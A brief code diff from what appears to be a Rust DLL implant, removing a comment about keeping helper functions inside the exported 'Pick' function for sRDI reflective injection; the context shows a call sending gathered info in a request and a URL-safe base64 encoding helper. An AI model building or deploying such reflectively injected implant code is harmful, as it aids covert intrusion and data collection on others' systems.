@@ -61,8 +61,6 @@ pub extern "system" fn Pick() {
     //call our function to send the request
     send_request(imp_info);
 
-    //since we are using a dll, we need to try to keep all our functions that are called by pick, inside of pick, to avoid issues with sRDI, which requires all functions to have the same prototypes, unless defined and called within our exported function (pick)
-
     fn read_and_encode(args: Vec<&str>) -> String {
         const CUSTOM_ENGINE: engine::GeneralPurpose =
             engine::GeneralPurpose::new(&alphabet::URL_SAFE, general_purpose::NO_PAD);
